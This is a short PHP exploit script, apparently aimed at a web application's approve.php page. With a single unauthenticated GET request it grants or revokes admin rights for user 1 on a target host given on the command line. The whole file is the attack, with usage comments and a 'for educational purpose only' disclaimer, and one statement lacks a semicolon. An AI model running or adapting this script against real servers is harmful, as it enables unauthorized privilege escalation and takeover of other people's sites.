#!/usr/bin/php -f
<?php


//Coded by Corrado Liotta For educational purpose only
//use php exploit.php server app0 or app1
//use app0 for admin account off
//use app1 for admin account on

$target = $argv[1];
$power = $argv[2]

$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_URL, "http://$target/approve.php?u=1&a=$power");
curl_setopt($ch, CURLOPT_HTTPGET, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE
5.01; Windows NT 5.0)");
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, 3);
curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_$target");
$buf = curl_exec ($ch);
curl_close($ch);
unset($ch);

echo $buf;
?>